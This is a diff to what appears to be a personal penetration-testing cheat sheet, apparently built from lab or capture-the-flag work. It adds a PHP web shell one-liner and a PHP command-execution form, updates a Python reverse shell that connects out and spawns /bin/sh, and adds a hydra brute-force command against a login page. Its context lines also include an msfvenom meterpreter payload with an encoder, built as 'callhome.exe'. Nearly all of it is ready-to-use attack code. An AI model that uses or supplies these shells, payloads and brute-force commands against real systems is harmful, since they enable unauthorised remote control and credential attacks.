@@ -2,6 +2,30 @@
 
 Just various bits of script and techniques I've found useful.
 
+## reverse shells
+
+PHP one liner:
+
+`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`
+
+PHP interactive shell:
+
+```
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+<script>document.getElementById("cmd").focus();</script>
+```
+
 ## Reverse shells
 
 Bash (almost never works in my experience):
@@ -10,7 +34,7 @@ Bash (almost never works in my experience):
 
 Python (almost always works in my experience):
 
-`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.105.239",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.136.49",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
 ## shell tricks
 
@@ -27,6 +51,8 @@ creating a windows exe that will call home:
 `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.100.16 LPORT=4443 -f exe -o callhome.exe`
 
 ## Brute forcing with hydra
+
+`hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.php:username=^USER^&password=^PASS^&login=login:Login failed"`
 
 The below targets an aspx page, that needed viewstate to go with it in order to get the error message back:
 
